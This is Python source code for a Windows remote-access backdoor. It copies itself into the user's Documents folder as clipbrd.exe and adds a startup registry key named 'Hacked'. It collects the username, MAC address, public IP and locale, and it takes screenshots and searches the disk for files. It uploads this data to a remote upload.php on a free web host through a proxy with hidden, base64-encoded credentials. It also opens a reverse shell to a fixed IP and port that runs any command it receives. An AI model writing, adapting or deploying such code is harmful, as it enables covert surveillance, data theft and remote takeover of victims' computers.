import socket
import tempfile
from PIL import ImageGrab
from base64 import b64decode
import platform
from getpass import getuser
from locale import getdefaultlocale
import subprocess
import os
import shutil
import _winreg as wreg
from uuid import getnode as get_mac
import json
from datetime import datetime
import requests

uploadURL = 'http://monohydric-variatio.000webhostapp.com/upload.php'
identification = {}
botname = ''
proxy = {'http': "http://" + b64decode("cml0MjAxNTA0NA==") + ":" + b64decode("SWlpdGEwNDQ=") + "@172.31.1.6:8080"}


def transfer(s, path):
    if os.path.exists(path):
        f = open(path, 'rb')
        packet = f.read(1024)
        while packet != '':
            s.send(packet)
            packet = f.read(1024)
        s.send('DONE')
        f.close()

    else:
        s.send("Unable to find file")


def persistence():
    path = os.getcwd().strip('\n')  # get the current working directory
    Null, userprof = subprocess.check_output('set USERPROFILE', shell=True).split('=')  # Get userprofile

    # Place where you wish your backdoor to be copied , here it is C:\Users\<UserName>\Documents
    destination = userprof.strip('\n\r') + '\\Documents' + '\clipbrd.exe'

    if not os.path.exists(destination):
        shutil.copyfile(path + '\clipbrd.exe', destination)
        # This is one of the keys that allows to run on startup , others can be found using
        # sysinternals tools and other methods like googling
        key = wreg.OpenKey(wreg.HKEY_CURRENT_USER, "Software\Microsoft\Windows\CurrentVersion\Run",
                           0, wreg.KEY_ALL_ACCESS)
        # Hacked is the key name that will run our backdoor on startup
        wreg.SetValueEx(key, 'Hacked', 0, wreg.REG_SZ, destination)
        key.Close()


def sendGet(Url):
    response = requests.get(url=Url, proxies=proxy)
    return response


def sendPost(Url, data, files=None):
    response = requests.post(url=Url, data=data, proxies=proxy)
    return response


def getSysDetails():
    global identification
    # generate a unique id to identify the PC
    publicIP = sendGet("http://www.httpbin.org/ip")  # Retrieves ip , local and global
    IP = publicIP.json()  # creates a json object of IPs received
    IP = IP['origin'].split(',')
    if len(IP) > 1:
        publicIP = IP[len(IP) - 1]  # last ip is the public ip
    else:
        publicIP = IP[0]  # last ip is the public ip
    addr = get_mac()  # To uniquely identify the PC
    h = iter(hex(addr)[2:].zfill(12))
    macAddr = "_".join(
        i + next(h) for i in h)  # Taken from http://stackoverflow.com/questions/28927958/python-get-mac-address
    username = getuser()  # Get Username
    locale = getdefaultlocale()[0]  # Helps in identifying the country
    plat = platform.platform()
    arch = platform.machine()
    nodename = platform.node()
    global botname
    botname = locale + '_' + username + '_' + macAddr
    identification = {'botname': botname, 'locale': locale, 'username': username, 'macAddr': macAddr,
                      'publicIP': publicIP,
                      'platform': plat, 'architecture': arch, 'Name': nodename}
    iD = identification
    return json.dumps(iD)


def screenshot():
    dirpath = tempfile.mkdtemp()
    now = str(datetime.now()).replace(" ", "_")
    now = now.replace(":", "_")
    ImageGrab.grab().save(dirpath + now + "\img.jpg", "JPEG")
    files = {'fileToUpload': open(dirpath + now + "\img.jpg", 'rb')}
    r = sendFile(files)
    files['fileToUpload'].close()
    shutil.rmtree(dirpath)


def sendFile(files=None):
    response = requests.post(uploadURL, data={'botname': botname}, files=files, proxies={
        'http': "http://" + b64decode("cml0MjAxNTA0NA==") + ":" + b64decode("SWlpdGEwNDQ=") + "@172.31.1.6:8080"})
    return response


def search(command):
    # received command as "search C:\\*.pdf
    command = command[7:]
    path, ext = command.split('*')

    listOfFiles = ''

    for dirpath, dirname, files in os.walk(path):
        for file in files:
            if file.endswith(ext):
                listOfFiles = listOfFiles + '\n' + os.path.join(dirpath, file)

    res = sendPost(uploadURL, data=listOfFiles)


def initialize():
    persistence()
    global identification
    identification = getSysDetails()  # send sysDetails on initialisation and set hostname for identifying bot
    dirpath = tempfile.mkdtemp()
    files = open(dirpath + '\identity.txt', 'wb')
    files.write(json.dumps(identification))
    files.close()
    files = {'fileToUpload': open(dirpath + '\identity.txt', 'rb')}
    r = sendFile(files)
    files['file'].close()
    shutil.rmtree(dirpath)


initialize()


def connect():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(('172.26.47.11', 1996))
    s.send(getuser())

    while True:
        command = s.recv(1024)
        if 'terminate' in command:
            s.close()
            break

        elif 'grab' in command:
            grab, path = command.split("*")
            try:
                transfer(s, path)
            except Exception, e:
                s.send(str(e))
                pass

        elif 'sendToServer' in command:
            grab, path = command.split('*')
            if os.path.exists(path):
                files = {'file': open(path, 'rb')}
                r = sendFile(files)
            else:
                r = sendPost(uploadURL, data='[-]File Not Found')

        elif 'screencap' in command:
            screenshot()

        elif 'cd' in command:
            code, directory = command.split(',')
            os.chdir(directory)
            s.send("[+] CWD is " + os.getcwd())

        else:
            CMD = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE,
                                   stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            s.send(CMD.stdout.read() + "\n" + CMD.stderr.read())  # sending the result
            s.send('DONE')
            # s.send()  # in case there is a typo by server side


def main():
    initialize()
    connect()


main()
